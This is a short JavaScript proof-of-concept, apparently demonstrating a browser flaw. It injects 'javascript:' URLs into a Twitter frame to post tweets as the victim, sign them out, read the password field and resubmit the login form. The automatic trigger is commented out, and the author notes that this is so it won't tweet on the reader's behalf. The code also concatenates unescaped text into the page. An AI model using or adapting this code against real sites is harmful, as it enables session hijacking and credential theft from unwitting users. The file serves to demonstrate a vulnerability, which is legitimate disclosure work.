// Questions? Tweet me here: @magicmac2000


document.body.innerHTML =	'<textarea id=taText spellcheck="false" cols=40 rows=5></textarea><br /><br />' +
							'<input value="Tweet!" onclick="tweet(taText.value)" type="button" />&nbsp;' +
							'<input value="Sign Out" onclick="signOut()" type="button" />&nbsp;' +
							'<input value="Get Password" onclick="get_Password()" type="button" />&nbsp;' +
							'<input value="Sign In" onclick="signIn()" type="button" />';


function executeInTwitter(strCode)
{
	window.open('javascript:' + strCode, 'dm-post-iframe');
}


function tweet(text)
{
	var tweetCode =	'window.boxTextToTweet = parent.document.getElementById("tweet-box-home-timeline");' +
					'window.btnPostTweet = parent.document.getElementsByClassName("btn primary-btn tweet-action tweet-btn js-tweet-btn")[0];' +
					'boxTextToTweet.focus();' +
					'boxTextToTweet.innerHTML = "' + text + '";' +
					'setTimeout(\'btnPostTweet.click()\', 100);';
	executeInTwitter(tweetCode);
}

function signOut()
{
	var signOutCode = 'parent.document.getElementById("signout-button").click();';
	executeInTwitter(signOutCode);
}

function signIn()
{
	var signInCode = 'parent.document.querySelectorAll("[pb-role=submit]")[0].click();';
	executeInTwitter(signInCode);
}
function getPassword()
{
	var passCode = 'alert("Your password is: " + parent.document.querySelectorAll("[pb-role=password]")[0].value)';
	executeInTwitter(passCode);
}


// This function does the automatic injection.
// Disabled so we don't tweet on your behalf!
function doInTwitter()
{
	tweet("Species adapt to their environment or go extinct. The same applies to web-browsers, and yours is *not* adapting. " + unescape("%uD83D%uDE48%uD83D%uDE49%uD83D%uDE4A") + "<br><br>Cheers!<br>Alfred. " + unescape("%uD83D%uDC4D%uD83D%uDE1C"));
	setTimeout(signOut, 3000);
	setTimeout(getPassword, 8000);
	setTimeout(signIn, 10000);
}
//window.onload = doInTwitter;




